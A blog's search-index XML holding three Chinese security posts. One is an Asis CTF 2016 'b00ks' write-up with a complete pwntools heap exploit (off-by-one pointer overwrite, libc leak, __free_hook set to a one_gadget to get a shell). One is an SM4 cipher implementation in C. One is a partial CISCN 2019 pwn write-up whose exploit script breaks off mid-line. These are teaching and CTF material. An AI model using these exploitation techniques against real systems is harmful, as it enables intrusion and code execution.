<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Off-By-One之Asis CTF 2016 b00s]]></title>
    <url>%2F2019%2F05%2F04%2FOff-By-One%E4%B9%8BAsis%20CTF%202016%20b00s%2F</url>
    <content type="text"><![CDATA[题目介绍题目是一个表单程序，功能是一个图书管理系统。 12345671. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt; 程序提供了创建、删除、编辑、打印、修改author name的功能，除了 canary 外，其他保护全开 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled 首先程序会要求输入author name，存到bss 段 unk_202040 中，限制大小为32，用自己构造的函数读取，接下来看create函数的功能：输入book name’s size 然后 malloc(size) ，读入name，限制长度是32，接着输入description’s size 也同样malloc(size)，读入description，不限制长度。接下来为book结构体申请一个0x20的空间 12345678910book = malloc(0x20uLL);if ( book )&#123; *(book + 6) = size; *(book_addr + id) = book; *(book + 2) = description; *(book + 1) = name; *book = ++unk_202024; return 0LL;&#125; book结构体的指针会存到unk_202060处，也就是authon name 紧跟着的后面 漏洞程序的主要漏洞就存在其自己构造的read函数中，因为对边界处理不当，导致写入时存在1个字节的溢出，即off-by-one 123456789101112131415161718192021signed __int64 __fastcall my_read(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == 10 ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125; 事实上，当写入author name最长长度32时，my_read 读入的结束符&#39;\x00&#39;是写到0x56260bc1b060上的，即unk_202040 + unk_202060也就是book_addr ，那么，当写入book1时，’\x00’就会被覆盖为book1的地址，通过打印author name就可以获得一个堆地址book1_addr。 12345678910111213pwndbg&gt; x/10gx 0x56260bc1b0400x56260bc1b040: 0x6161616161616161 0x61616161616161610x56260bc1b050: 0x6161616161616161 0x61616161616161610x56260bc1b060: 0x0000000000000000 0x00000000000000000x56260bc1b070: 0x0000000000000000 0x00000000000000000x56260bc1b080: 0x0000000000000000 0x0000000000000000-------------------------------------------------------------------------------------------------pwndbg&gt; x/10gx 0x56260bc1b0400x56260bc1b040: 0x6161616161616161 0x61616161616161610x56260bc1b050: 0x6161616161616161 0x61616161616161610x56260bc1b060: 0x000056260bd2e160 0x00000000000000000x56260bc1b070: 0x0000000000000000 0x00000000000000000x56260bc1b080: 0x0000000000000000 0x0000000000000000 off-by-one 覆盖指针低字节程序提供了一个change 功能，用于修改author name，所以可以通过修改author name 将book1的低字节覆盖为’\x00’，覆盖之后这个指针会指向book1 的 description ，程序同样也提供了edit功能修改description中的内容，所以我们可以在description 中布置数据伪造一个book结构，这个book结构 中的name 和 description 指针均可以直接抑制。 再次调用printf()函数打印将可直接得到book2_name_addr （这里需要注意的是，对于book2需要申请一个非常大的空间，才能使用堆块mmap分配，才能够泄漏libc base addr）在gdb中下断，用得到的book2_name_addr - libcbase 即可得到到libcbase 的偏移，这个偏移是不变的，而且每个人的环境不同偏移也可能不一样，这样就拿到了libcbase了。 因为程序开户了RELOR，got表不可改，但是可以改写__free_hook或__malloc_hook结合前面泄漏的libcbase可以得到onegadget 地址，最后通过修改book1跟book2的description实现任意地址写，将__free_hook内容写入为onegadget，free即可调用onegadget（free时，如果 __free_hook不为空，即执行free_hook） exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#coding:utf-8from pwn import *#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p = process('./b00ks')elf = ELF('./b00ks')libc = elf.libccontext.log_level = 'debug'def create(name_size,name,des_size,des): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(name_size)) p.recvuntil('(Max 32 chars): ') p.sendline(name) p.recvuntil('size: ') p.sendline(str(des_size)) p.recvuntil('description: ') # debug(0x10B7,1) p.sendline(des)def printf(): p.recvuntil('&gt; ') # debug(0xd56,1) p.sendline('4')def editbook(book_id,new_des,a): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil(': ') p.writeline(str(book_id)) p.recvuntil(': ') if a: debug(0xf30,1) p.sendline(new_des)def change_author_name(): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('name: ') debug(0xb99,1) p.sendline('a'*32)def delete(id): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('Enter the book id you want to delete: ') p.sendline(str(id))p.recvuntil('name: ')p.sendline('a'*32)create(142,'n0va',142,'n0va')create(0x21000,'book2_name2',0x21000,'book2_des')# create(32,'n0va',32,'n0va')printf()# pause()p.recvuntil('a'*32)book1_addr = u64(p.recv(6).ljust(8,'\x00'))book2_addr = book1_addr + 0x30print "book1_addr --&gt; " + hex(book1_addr)print "book2_addr --&gt; " + hex(book2_addr)# book1_addr + 0x38 = book2_name# book1_addr + 0x40 = book2_despayload = 'a'*0x40 + p64(1) + p64(book1_addr+0x38) + p64(book1_addr+0x40) + p64(0xffff)editbook(1,payload,0)change_author_name()printf()p.recvuntil('Name: ')book2_name_addr = u64(p.recv(6).ljust(8,'\x00'))p.recvuntil('Description: ')book2_des_addr = u64(p.recv(6).ljust(8,'\x00'))print "book2_name_addr --&gt; " + hex(book2_name_addr)print "book2_des_addr --&gt; " + hex(book2_des_addr)pause()offset = 0x5ac010 #泄漏出来的地址（即book2_name_addr)跟 libcbase的偏移，不同环境这个值会不同libcbase = book2_name_addr - offsetfree_hook = libc.symbols['__free_hook'] + libcbasesystem = libc.symbols['system'] + libcbaseonegadget = libcbase + 0x4526abinsh_addr = libc.search('/bin/sh').next() + libcbaseprint "free_hook --&gt; " + hex(free_hook)print "system --&gt; " + hex(system)print "binsh_addr --&gt; " + hex(binsh_addr)print "onegadget --&gt; " + hex(onegadget)# pause()payload = p64(free_hook) + p64(free_hook)editbook(1,payload,0)payload = p64(onegadget)editbook(2,payload,0)delete(2)p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[国密加密算法sm4]]></title>
    <url>%2F2019%2F04%2F25%2Fsm4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[概述SM4加密算法属于对称加密算法，2012年3月，国家密码管理局正式公布了包含SM4分组密码算法在内的《祖冲之序列密码算法》等6项密码行业标准。与DES和AES算法类似，SM4算法是一种分组密码算法。其分组长度为128bit，密钥长度也为128bit。加密算法与密钥扩展算法均采用32轮非线性迭代结构，以字（32位）为单位进行加密运算，每一次迭代运算均为一轮变换函数F。SM4算法加/解密算法的结构相同，只是使用轮密钥相反，其中解密轮密钥是加密轮密钥的逆序。 SM4算法结构图：(图片来源网上) 参数介绍​ 1、字节：由8位2进制数表示 ，字：由32位2进制数表示； ​ 2、S盒：固定的8bit输入、输出转换数组； ​ 3、加密密钥长度为128bit，表示为MK=（MK0,MK1,MK2,MK3），其中MKi为字。轮密钥表示为rki(i=0,1,2,3……31)为字。FK = (FK0,FK1,FK2,FK3)为系统 参数,CK = (CK0,CK1,CK2,……,CK31)为固定参数，都为字。 加密加密原理这里就不讲了，网上有不少详细的文章，下面直接开始算法的实现。 在开始加密算法之前，先介绍几个宏定义： 123456789101112131415161718192021222324//将字符型数组b的第i到第i+3位的二进制拼接成一个4*8=32bit的整数，存入n中#define GET_ULONG_BE(n,b,i) \&#123; \ (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \ | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \ | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \ | ( (unsigned long) (b)[(i) + 3] ); \&#125;#endif//将整数n的32位的二进制表示转换为4个char的数组，存入数组b的第i到第i+3位#ifndef PUT_ULONG_BE#define PUT_ULONG_BE(n,b,i) \&#123; \ (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \ (b)[(i) + 3] = (unsigned char) ( (n) ); \&#125;#endif//循环左移 的巧妙实现（SHL(x,n)可以得到左移n位之后的结果，然后与右移的结果((x) &gt;&gt; (32 - n))逐位或来将右边空缺的n位补齐，效率比较高。） #define SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))//交换#define SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125; 密钥调试算法先建立一个结构体来保存上下文信息，即加密模式和各轮子密钥：(这个结构体我是定义在sm4.h头文件中) 123456typedef struct&#123; int mode; /*!&lt; encrypt/decrypt */ unsigned long sk[32]; /*!&lt; SM4 subkeys */&#125;sm4_context; 首先需要设置密钥，调用sm4_setkey_enc(&amp;ctx,key);函数，这个函数会设置mode为加密，并调用sm4_setkey(ctx-&gt;sk,key);函数来完成密钥的操作 12345678910111213141516171819202122void sm4_setkey_enc(sm4_context *ctx,unsigned char key[16])&#123; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey(ctx-&gt;sk,key);&#125;static void sm4_setkey(unsigned long SK[32],unsigned char key[16])&#123; unsigned long MK[4]; unsigned long k[36]; unsigned long i = 0; //先通过宏将初始的密钥转换为4个32位bit的整数，并为计算各轮密钥预先准备好初始值 GET_ULONG_BE(MK[0],key,0); GET_ULONG_BE(MK[1],key,4); GET_ULONG_BE(MK[2],key,8); GET_ULONG_BE(MK[3],key,12); k[0] = MK[0]^FK[0]; k[1] = MK[1]^FK[1]; k[2] = MK[2]^FK[2]; k[3] = MK[3]^FK[3]; for(;i&lt;32;i++)&#123; k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]); SK[i] = k[i+4]; &#125; &#125; 对于第i轮的密钥SK[i]，其是由k[i]和对k[i+1]^k[i+2]^k[i+3]^CK[i]的复合变换T‘异或得到的： SK[i] = k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]);函数sm4CaliRk就是变换T’,先进行Sbox的非线性替换，然后进行线性变换，线性变换L为：rk = bb^(ROTL(bb, 13))^(ROTL(bb, 23)); 123456789101112131415static unsigned long sm4CaliRk(unsigned long ka)&#123; //复合变换T unsigned long bb = 0; //unsigned long 4字节( 32bit ) unsigned long rk = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0) //换转成8bit一个字符 b[0] = sm4Sbox(a[0]); b[1] = sm4Sbox(a[1]); b[2] = sm4Sbox(a[2]); b[3] = sm4Sbox(a[3]); GET_ULONG_BE(bb,b,0) //将变换结果转换为32bit的整数 //对得到的32位整数bb进行线性变换 rk = bb^ROTL(bb,13)^ROTL(bb,23); return rk;&#125; 至此，密钥就已经生成了 加密过程调用函数void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)对密文input进行电码本模式加密(ECB)，加密的核心是调用了static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )函数对第一块密文进行加密 1234567891011121314151617181920212223242526272829303132333435363738394041void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)&#123; while( length &gt; 0 ) &#123; sm4_one_round( ctx-&gt;sk, input, output ); input += 16; output += 16; length -= 16; &#125; &#125;static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )&#123; unsigned long i = 0; unsigned long ulbuf[36]; memset(ulbuf, 0, sizeof(ulbuf)); GET_ULONG_BE( ulbuf[0], input, 0 ) GET_ULONG_BE( ulbuf[1], input, 4 ) GET_ULONG_BE( ulbuf[2], input, 8 ) GET_ULONG_BE( ulbuf[3], input, 12 ) while(i&lt;32) &#123; ulbuf[i+4] = sm4F(ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3], sk[i]);// #ifdef _DEBUG// printf("rk(%02d) = 0x%08x, X(%02d) = 0x%08x \n",i,sk[i], i, ulbuf[i+4] );// #endif i++; &#125; PUT_ULONG_BE(ulbuf[35],output,0); PUT_ULONG_BE(ulbuf[34],output,4); PUT_ULONG_BE(ulbuf[33],output,8); PUT_ULONG_BE(ulbuf[32],output,12);&#125; sm4_one_round()函数中，先将128位的输入input转为四个32位的整数，放入ulbuf[4]中，然后迭代地调用函数static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)进行32轮加密，第一轮加密都需要使用之前的128位的结果ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3]和该轮的密钥 sk[i]，产生出该轮的密文ulbuf[i+4]，最后的密文存储在ulbuf[35]~ulbuf[32]中，转换为字符数组形式放入output 中。 12345//一轮加密 static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)&#123; return (x0^sm4Lt(x1^x2^x3^rk));&#125; sm4Lt()是一个合成变换，由非线性变换t和线性变换L复合而成：首先将输入的整数 ka 转换为8比特一个的字符，然后使用S盒进行线性变换，再将变换结果转为32比特的整数，最后对得到的32位整数bb进行线性变换：c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); 12345678910111213141516171819static unsigned long sm4Lt(unsigned long ka)&#123; unsigned long bb = 0; unsigned long c = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0)// b[0] = sm4Sbox(a[0]);// b[1] = sm4Sbox(a[1]);// b[2] = sm4Sbox(a[2]);// b[3] = sm4Sbox(a[3]); b[0] = Sbox[a[0]]; b[1] = Sbox[a[1]]; b[2] = Sbox[a[2]]; b[3] = Sbox[a[3]]; GET_ULONG_BE(bb,b,0) c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); return c;&#125; 整个加密过程就结束了，不过上面提到的是ECB的加密模式：又称电子密码本模式：Electronic codebook，是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理。这种加密不能很好地隐藏数据模式。 SM4常见的也有另一种加密模式：CBC：密码分组链接（CBC，Cipher-block chaining）模式，由IBM于1976年发明，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量IV。 1234567891011121314151617181920212223242526272829303132333435363738394041424344//CBC模式加解密 void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output )&#123; int i; unsigned char temp[16]; if( mode == SM4_ENCRYPT ) &#123; while( length &gt; 0 ) &#123; for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( input[i] ^ iv[i] ); sm4_one_round( ctx-&gt;sk, output, output ); memcpy( iv, output, 16 ); input += 16; output += 16; length -= 16; &#125; &#125; else /* SM4_DECRYPT */ &#123; while( length &gt; 0 ) &#123; memcpy( temp, input, 16 ); sm4_one_round( ctx-&gt;sk, input, output ); for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( output[i] ^ iv[i] ); memcpy( iv, temp, 16 ); input += 16; output += 16; length -= 16; &#125; &#125;&#125; 解密过程解密前，首先要通过void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] )函数设定解密时使用的key，这个函数还会将密钥的顺序倒置，然后调用sm4_crypt_ecb()即可解密。 实际上，SM4的解密变换与加密变换结构相同，不同的仅仅是轮密钥的使用顺序相反。 完整的代码sm4.h文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100/** * \file sm4.h */#ifndef XYSSL_SM4_H#define XYSSL_SM4_H #define SM4_ENCRYPT 1#define SM4_DECRYPT 0#ifndef GET_ULONG_BE//将字符型数组b的第i到第i+3位的二进制拼接成一个4*8=32bit的整数，存入n中#define GET_ULONG_BE(n,b,i) \&#123; \ (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \ | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \ | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \ | ( (unsigned long) (b)[(i) + 3] ); \&#125;#endif//将整数n的32位的二进制表示转换为4个char的数组，存入数组b的第i到第i+3位#ifndef PUT_ULONG_BE#define PUT_ULONG_BE(n,b,i) \&#123; \ (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \ (b)[(i) + 3] = (unsigned char) ( (n) ); \&#125;#endif//循环左移 的巧妙实现（SHL(x,n)可以得到左移n位之后的结果，然后与右移的结果((x) &gt;&gt; (32 - n))逐位或来将右边空缺的n位补齐，效率比较高。） #define SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))#define SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125; /** * \brief SM4 context structure */typedef struct&#123; int mode; /*!&lt; encrypt/decrypt */ unsigned long sk[32]; /*!&lt; SM4 subkeys */&#125;sm4_context; #ifdef __cplusplusextern "C" &#123;#endif /** * \brief SM4 key schedule (128-bit, encryption) * * \param ctx SM4 context to be initialized * \param key 16-byte secret key */void sm4_setkey_enc( sm4_context *ctx, unsigned char key[16] ); /** * \brief SM4 key schedule (128-bit, decryption) * * \param ctx SM4 context to be initialized * \param key 16-byte secret key */void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] ); /** * \brief SM4-ECB block encryption/decryption * \param ctx SM4 context * \param mode SM4_ENCRYPT or SM4_DECRYPT * \param length length of the input data * \param input input block * \param output output block */void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output); /** * \brief SM4-CBC buffer encryption/decryption * \param ctx SM4 context * \param mode SM4_ENCRYPT or SM4_DECRYPT * \param length length of the input data * \param iv initialization vector (updated after use) * \param input buffer holding the input data * \param output buffer holding the output data */void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output ); #ifdef __cplusplus&#125;#endif #endif /* sm4.h */ sm4.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229#include &lt;iostream&gt;#include &lt;string.h&gt;#include "sm4.h"using namespace std; //S盒 const unsigned char Sbox[256] = &#123; 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05, 0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99, 0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62, 0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6, 0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8, 0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35, 0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87, 0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e, 0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1, 0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3, 0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f, 0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51, 0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8, 0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0, 0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48 &#125;;//CK为固定参数 const unsigned int CK[32] = &#123; 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 &#125;;//FK为系统参数 static const unsigned long FK[4] = &#123;0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc&#125;;static unsigned char sm4Sbox(unsigned char inch)&#123; unsigned char *pTable = (unsigned char *)Sbox; unsigned char retVal = (unsigned char)(pTable[inch]); return retVal;&#125;//已知加密密钥MK，求轮转密钥rkstatic unsigned long sm4CaliRk(unsigned long ka)&#123; //复合变换T unsigned long bb = 0; //unsigned long 4字节( 32bit ) unsigned long rk = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0) //换转成8bit一个字符 b[0] = sm4Sbox(a[0]); b[1] = sm4Sbox(a[1]); b[2] = sm4Sbox(a[2]); b[3] = sm4Sbox(a[3]); GET_ULONG_BE(bb,b,0) //将变换结果转换为32bit的整数 //对得到的32位整数bb进行线性变换 rk = bb^ROTL(bb,13)^ROTL(bb,23); return rk;&#125;static void sm4_setkey(unsigned long SK[32],unsigned char key[16])&#123; unsigned long MK[4]; unsigned long k[36]; unsigned long i = 0; GET_ULONG_BE(MK[0],key,0); GET_ULONG_BE(MK[1],key,4); GET_ULONG_BE(MK[2],key,8); GET_ULONG_BE(MK[3],key,12); k[0] = MK[0]^FK[0]; k[1] = MK[1]^FK[1]; k[2] = MK[2]^FK[2]; k[3] = MK[3]^FK[3]; for(;i&lt;32;i++)&#123; k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]); SK[i] = k[i+4]; &#125; &#125;void sm4_setkey_enc(sm4_context *ctx,unsigned char key[16])&#123; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey(ctx-&gt;sk,key);&#125;static unsigned long sm4Lt(unsigned long ka)&#123; unsigned long bb = 0; unsigned long c = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0)// b[0] = sm4Sbox(a[0]);// b[1] = sm4Sbox(a[1]);// b[2] = sm4Sbox(a[2]);// b[3] = sm4Sbox(a[3]); b[0] = Sbox[a[0]]; b[1] = Sbox[a[1]]; b[2] = Sbox[a[2]]; b[3] = Sbox[a[3]]; GET_ULONG_BE(bb,b,0) c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); return c;&#125;//一轮加密 static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)&#123; return (x0^sm4Lt(x1^x2^x3^rk));&#125;static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )&#123; unsigned long i = 0; unsigned long ulbuf[36]; memset(ulbuf, 0, sizeof(ulbuf)); GET_ULONG_BE( ulbuf[0], input, 0 ) GET_ULONG_BE( ulbuf[1], input, 4 ) GET_ULONG_BE( ulbuf[2], input, 8 ) GET_ULONG_BE( ulbuf[3], input, 12 ) while(i&lt;32) &#123; ulbuf[i+4] = sm4F(ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3], sk[i]);// #ifdef _DEBUG// printf("rk(%02d) = 0x%08x, X(%02d) = 0x%08x \n",i,sk[i], i, ulbuf[i+4] );// #endif i++; &#125; PUT_ULONG_BE(ulbuf[35],output,0); PUT_ULONG_BE(ulbuf[34],output,4); PUT_ULONG_BE(ulbuf[33],output,8); PUT_ULONG_BE(ulbuf[32],output,12);&#125;//ECB模式 void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)&#123; while( length &gt; 0 ) &#123; sm4_one_round( ctx-&gt;sk, input, output ); input += 16; output += 16; length -= 16; &#125; &#125;//ECB模式解密密钥 void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] )&#123; int i; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey( ctx-&gt;sk, key ); for( i = 0; i &lt; 16; i ++ ) &#123; SWAP( ctx-&gt;sk[ i ], ctx-&gt;sk[ 31-i] ); &#125;&#125;//CBC模式加解密 void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output )&#123; int i; unsigned char temp[16]; if( mode == SM4_ENCRYPT ) &#123; while( length &gt; 0 ) &#123; for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( input[i] ^ iv[i] ); sm4_one_round( ctx-&gt;sk, output, output ); memcpy( iv, output, 16 ); input += 16; output += 16; length -= 16; &#125; &#125; else /* SM4_DECRYPT */ &#123; while( length &gt; 0 ) &#123; memcpy( temp, input, 16 ); sm4_one_round( ctx-&gt;sk, input, output ); for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( output[i] ^ iv[i] ); memcpy( iv, temp, 16 ); input += 16; output += 16; length -= 16; &#125; &#125;&#125; int main()&#123; unsigned char key[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;; unsigned char input[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;; unsigned char output[16]; sm4_context ctx; unsigned long i; //encrypt sm4_setkey_enc(&amp;ctx,key); sm4_crypt_ecb(&amp;ctx,1,16,input,output); //加密结果 printf("加密结果：\n"); for(i = 0;i&lt; 16;i ++)&#123; printf("%02x ",output[i]); &#125; printf("\n"); sm4_setkey_dec(&amp;ctx,key); sm4_crypt_ecb(&amp;ctx,0,16,output,output); //解密结果 printf("解密结果：\n"); for(i = 0;i&lt; 16;i ++)&#123; printf("%02x ",output[i]); &#125; printf("\n"); return 0; &#125; 参数文章：https://blog.csdn.net/cg129054036/article/details/83012721 https://blog.csdn.net/cg129054036/article/details/83016958 https://blog.csdn.net/archimekai/article/details/53095993]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全大赛部分Wp]]></title>
    <url>%2F2019%2F04%2F23%2F2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[pwnyour_pwn先check 一下，发现保护全开，还是有点慌的 进入到IDA审计代码 在其主要代码里存在下标溢出，很明显地可以进行任意地址读和写（因为对于数组v4的下标v1没有进行任何的限制)，思路其实就出来了，先利用任意地址读泄漏出真实地址，再通过任意地址写将返回地址修改成onegadget 只是这里的读和写处理有点麻烦而已，因为它是单个字节读取和写入的，所以每次都要进行6次操作。 先确定v4[0]的位置gdb下断第一次输入v4[0]=100(0x64)单步跟踪找到0x64的位置 确定返回地址和要泄漏的真实地址跟v4[0]的偏移 这里其实我还算出另一个偏移：就是v1跟v4[0]的偏移，是40，为最后的退出getshell做准备，同样找到v1的位置就可以了，这里我就不截图了。 获得onegadget地址找泄漏出真实地址之后 就可以得到偏移，再查看onegadget：one_gadget+libc库 修改返回地址为onegadgetexp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#coding:utf-8from pwn import *context.log_level = 'debug'#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p = process('./pwn')# p = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")elf 